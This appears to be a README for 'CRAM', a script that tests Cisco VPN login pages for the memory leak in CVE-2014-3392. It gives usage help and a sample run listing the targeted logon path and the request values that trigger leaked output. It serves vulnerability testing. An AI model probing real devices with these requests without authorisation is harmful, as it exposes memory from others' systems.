# CRAM
Cisco Randomly Accessed Memory<br/>
<br/>
This script is associated with CVE-2014-3392<br/>
http://www.securityfocus.com/bid/70306<br/>
http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20141008-asa<br/>
<br/>
This simple script is used to test Cisco VPN login/logout pages for the noted memory leak in CVE-2014-3392.<br/>
<br/>
The script is not perfect and I am always open for suggestions on how to improve it.
<br/>
Sample Usage:<br/>
<pre>
$ CRAM -h
CRAM [-h] [-t] [-v] [-r]

  -h    Show this help text
  -t    Target (Required)
  -v    Verbose
  -r    Number of Random number requests
</pre>
<pre>
$ CRAM -t example.com

Page to be targeted: https://example.com/+CSCOE+/logon.html?

The following requests have been known to generate output:
Success: -88
Success: -102
Success: -202
Success: -22222
Fail (-99999)

The following requests will use random numbers:
Fail (-56199)
Success: -196985
Fail (-5666)
Fail (-77368)
Fail (-71669)
Fail (-11153)
Fail (-178318)
Fail (-71728)
Fail (-51999)
Success: -83449

10 random numbers were tested against example.com
</pre>
